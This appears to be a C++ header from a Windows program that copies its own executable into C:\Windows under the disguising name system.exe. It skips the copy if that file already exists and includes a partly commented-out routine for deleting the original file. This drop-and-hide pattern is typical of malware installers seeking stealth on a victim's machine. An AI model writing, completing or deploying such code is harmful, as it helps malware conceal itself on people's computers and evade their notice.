/*
*	install.h
*/

#ifndef __INSTALL
#define __INSTALL

#include <stdlib.h>
#include <fstream>
#include <windows.h>
#include <vector>
#include <sstream>
#include <iostream>
#include "lib.h"
#include "resources.h"

const char* EXEC_DROP_PATH = "C:\\Windows\\system.exe";

char* GetDefaultModuleFileName(void) {
	char* szModuleFileName = (char*)malloc(MAX_PATH);
	GetModuleFileNameA(NULL, szModuleFileName, MAX_PATH);
	return szModuleFileName;
}

LPSTR moduleFileName = GetDefaultModuleFileName();

bool execInstalled(void) {
	std::fstream file;
	file.open(EXEC_DROP_PATH, std::ios::in);

	if (file) {
		return true;
	}

	return false;
}

void install(void) {
	std::fstream in;
	in.open(moduleFileName, std::ios::in);

	if (in) {
		std::fstream out;
		out.open(EXEC_DROP_PATH, std::ios::out);
		if (out) {
			CopyFileA(moduleFileName, EXEC_DROP_PATH, false);

			out.close();
			in.close();

			return;
		}

		in.close();
	}

	printf("Error copying executable");
}

void scheduleDeletion(void) {
	std::vector<std::string> fileNameSplit = split(moduleFileName, '\\');
	std::string lastSegment = fileNameSplit.back();
	const char* executable = lastSegment.c_str();

	// std::cout << (char*)scrpt_remove.data;

	// ShellExecuteA(NULL,
	// 	NULL,
	// 	"del",
	// 	parameters,
	// 	NULL,
	// 	0
	// );
}

void runCheck(void) {
	if (!execInstalled()) {
		install();
		scheduleDeletion();
	}
}

void uninstall(void) {
	printf("Uninstalling...");
	if (execInstalled()) {
		DeleteFileA(EXEC_DROP_PATH);
	}
}

#endif
